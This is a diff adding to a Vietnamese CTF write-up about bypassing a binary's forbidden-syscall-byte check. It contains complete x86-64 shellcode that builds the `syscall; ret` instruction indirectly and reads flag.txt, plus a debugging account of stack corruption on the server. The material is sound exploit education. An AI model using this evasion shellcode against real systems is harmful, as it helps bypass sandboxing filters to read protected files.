@@ -98,6 +98,7 @@ Trong vòng while loop:
 
   binary 64-bit là dùng `syscall`
 
+___
 ### Khai thác:
 
 Vậy ta phải viết shellcode mà không trực tiếp sử dụng đến syscall, tránh bị binary phát hiện forbidden bytes.
@@ -116,5 +117,87 @@ Có 2 cách để bypass cái syscall check này:
 
 Ta sẽ tiếp cận với cách 1:
 
+Shellcide:
+```asm
+shellcode = asm(r"""
+    // gián tiếp increment giá trị gốc thành syscall, r12 = syscall
+    xor rax, rax
+    mov eax, 0xc3050e   
+    inc eax  
+    push rax
+    mov r12, rsp       
 
-  
+    // viết tên file: flag.txt
+    xor rax, rax
+    push rax
+    mov rax, 0x7478742e67616c66  
+    push rax
+    mov rdi, rsp        
+
+    // open file
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 2
+    call r12            
+
+    sub rsp, 0x100  // đặc biệt chỗ này, sẽ giải thích sau    
+
+    // read file to memory
+    mov rdi, rax        
+    mov rsi, rsp        
+    mov rdx, 100        
+    xor rax, rax        
+    call r12
+
+    // write file ra output
+    mov rdi, 1          
+    mov rax, 1          
+    call r12
+
+    // thoát
+    mov rax, 60
+    xor rdi, rdi
+    call r12
+""")
+```
+Trong shellcode này:
+* Ta lấy `0xc3050e` (syscall; ret) - (0e 05, c3), để sau khi call syscall tại r12, ta return về shellcode an toàn
+* Lấy thanh ghi `r12` vì r12 được gọi là một `callee-saved`, giá trị trong r12 được đảm bảo là bảo toàn
+* Còn lại là open, read, write file flag.txt để retrieve flag
+
+Cách là thế, nhưng script ban đầu khi không có `sub rsp, 0x100`, chỉ chạy được local mà server thì không:
+* trong shellcode, ta đấy value syscall lên, sau đấy flag lên ngay cạnh nó trên stack
+* lúc này, r12 đang trỏ vào value syscall (0f 05 c3), sau đấy ta đấy `null` (8 bytes) + flag.txt (8 bytes), và giờ `rsp` = r12 - 16 
+  ```asm
+  STACK
+  _____________
+  | flag.txt  | <- rsp 
+  | null      |
+  | syscall   | <- r12
+  | ...       | 
+  ...
+  ```
+* đến đoạn **read file to memory**, ta chạy `read(fd, buffer=rsp, count=100).`, tức là đọc 100 bytes từ flag.txt vào memory bắt đầu từ `rsp`
+* giá trị trong flag.txt sẽ được đọc vào memory từ rsp tràn xuống dưới sao cho đủ 16 bytes (0-15), nhưng từ byte 16 trở đi là sẽ overwrite r12 (syscall)
+* lý do, chạy local ra được flag, là vì flag.txt của local rất bé (< 16 bytes), không tràn đến giá trị syscall trên stack. Trong khi flag.txt của server lớn hơn nhiều nên overwrite syscall trên stack.
+```c
+└─$ cat flag.txt 
+KCSC{test}   
+```
+* Vì thế nên bố sung dòng sau để cấp phát đủ ô nhớ cho flag:
+```asm
+sub rsp, 0x100
+```
+* update shellcode và chạy với local flag.txt dài hơn:
+```c
+└─$ cat flag.txt         
+CTF{THIS_IS_A_VERY_LONG_FLAG_THAT_WILL_CRASH_YOUR_STACK}
+```
+Local:
+<img width="800" height="319" alt="image" src="https://github.com/user-attachments/assets/9377e5be-81df-4b2f-ae79-7ea1192a47a3" />
+
+Server:
+<img width="803" height="315" alt="image" src="https://github.com/user-attachments/assets/5861d862-512c-4edd-8475-c8329ed61b72" />
+
+Nhận ra điều này khi chạy trên Docker cũng vẫn ra flag.txt: `KCSC{test}`, nhưng chạy server thì không. Nên suy ra lỗi không nằm ở các thanh ghi, mà khả năng value syscall bị corrupted
+
